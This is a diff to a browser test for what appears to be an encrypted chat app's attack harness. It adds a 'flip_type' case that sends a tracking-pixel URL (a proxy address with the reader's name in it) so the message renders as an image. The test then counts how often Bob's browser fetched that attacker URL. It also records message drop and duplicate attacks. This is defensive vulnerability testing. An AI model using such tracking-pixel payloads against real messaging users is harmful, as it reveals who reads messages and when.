@@ -139,7 +139,15 @@ test(`v0 attack: ${ATTACK}`, async ({ browser }) => {
     sent.push(t);
     await sendText(alice, t);
   }
+  // flip_type: a text that is a URL becomes <img src=URL> on Bob's side.
+  const proxyUrl = process.env.PROXY_URL;
+  if (ATTACK === "flip_type" && proxyUrl) await sendText(alice, `${proxyUrl}/__track.gif?reader=${BOB}`);
   await bob.page.waitForTimeout(3000);
+  if (ATTACK === "flip_type" && proxyUrl) {
+    const hits = (await (await fetch(`${proxyUrl}/__track-hits`)).json()) as { url: string }[];
+    result.trackingPixelHits = hits.length;
+    result.trackingPixelUrls = hits.map((h) => h.url);
+  }
 
   let received = 0;
   for (const t of sent) received += (await bob.page.getByText(t, { exact: false }).count()) > 0 ? 1 : 0;
@@ -156,7 +164,7 @@ test(`v0 attack: ${ATTACK}`, async ({ browser }) => {
   if (ATTACK === "flip_type")
     observed =
       imgCount > 0
-        ? `text rendered as <img> (${imgCount}) - tracking-pixel vector (no AAD)`
+        ? `text rendered as <img> (${imgCount}); Bob's browser fetched the attacker URL ${result.trackingPixelHits ?? 0}x (tracking pixel, no AAD)`
         : `no img rendered (received ${received}/${N} as text)`;
   else if (ATTACK === "drop") observed = `received ${received}/${N} (dropped messages also desync the shared ratchet)`;
   else if (ATTACK === "duplicate") observed = `received-distinct ${received}/${N}; duplicates re-fed to the single ratchet`;
